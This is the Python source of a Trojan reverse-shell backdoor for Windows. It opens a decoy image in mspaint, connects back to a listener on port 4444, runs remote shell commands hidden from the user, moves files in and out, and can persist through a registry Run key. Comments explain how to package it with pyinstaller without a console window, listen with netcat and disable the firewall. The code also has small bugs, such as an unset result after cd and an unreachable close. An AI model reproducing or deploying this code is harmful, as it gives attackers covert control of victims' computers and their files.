
import socket, subprocess, json, os, base64, sys
import shutil
class Backdoor:
    def __init__(self, ip, port):
        #self.become_presistent()
        self.ip = ip
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#create connection with socket
        self.connection.connect((ip, port))#connect with ip and port

        #use with netcat : nc -vv -l -p(spectify port want to use)
    def become_presistent(self):
        evil_file_location = os.environ["appdata"] + "\\Reverse_backdoor.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location) #__file__ in order to run .py files
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\currentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):

        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
            # except KeyboardInterrupt:
            #     break
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "changed working directory to" + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] upload successful"
    def read_file(self, path):
        with open(path, 'rb') as file:#use b64 to convert unknown char to known char in file
            return base64.b64encode(file.read()).decode("utf-8")

    def execute_system_command(self,command):
        DEVNULL = open(os.devnull, 'wb') #redirect eroor and input to DEVNULL(no pop up terminal)
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode("utf-8")

    def run(self):

        while True:
            # self.reliable_send(b"\n [+] Connection established. \n")

            command = self.reliable_receive()#buffer size
            if command[0] == "exit":
                self.connection.close()
                sys.exit() #safer way to exit py without showing error
            elif command[0] == "cd" and len(command) >1:
                self.change_working_directory_to(command[1])
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            elif command[0] == "upload":
                command_result = self.write_file(command[1],command[2])
                
            else:
                command_result = self.execute_system_command(command)


            self.reliable_send(command_result)

        connection.close()

file_name = sys._MEIPASS + "sample.jpg"
subprocess.Popen(["mspaint","sample.jpg"], shell=True)


try:
    my_backdoor = Backdoor("10.0.2.15", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
#compile file.
#pyinstaller (filename) --onefile --noconsole
#pyinstaller --add-data "{rootfilename},.(location)" --onefile --noconsole {filename}
#turn off firewall: advfirewall set allprofiles state off
